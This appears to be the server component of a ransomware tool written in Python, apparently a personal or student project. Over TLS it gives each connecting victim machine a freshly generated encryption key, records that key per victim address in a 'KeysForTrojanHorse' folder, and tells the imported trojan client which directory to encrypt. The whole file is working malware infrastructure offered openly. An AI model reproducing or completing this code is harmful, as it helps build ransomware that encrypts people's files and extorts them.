import socket
import ssl
import os
from TrojanRansomwareClient import TrojanRansomwareClient

def create_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("10.100.102.18", 8080))
    server.listen()
    return server

def accept_client(server):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=r"C:\\Program Files\\OpenSSL-Win64\\bin\\cert.pem", keyfile="C:\\Program Files\\OpenSSL-Win64\\bin\\key.pem")
    cs, ca = server.accept()
    ssl_server = context.wrap_socket(cs, server_side=True)
    return ssl_server, ca

def generate_private_key(ca):
    key = os.urandom(32)
    with open("c:\\Users\\אלעד\\Desktop\\KeysForTrojanHorse\\{}".format(ca), "wb") as f:
        f.write(key)
    return key

server, ca = accept_client(create_server())
key = generate_private_key(ca)
server.sendall(key)
directory_to_encrypt = "C:\\Users\\אלעד\\Desktop\\FilesToEncrypt"
server.sendall(directory_to_encrypt.encode())
    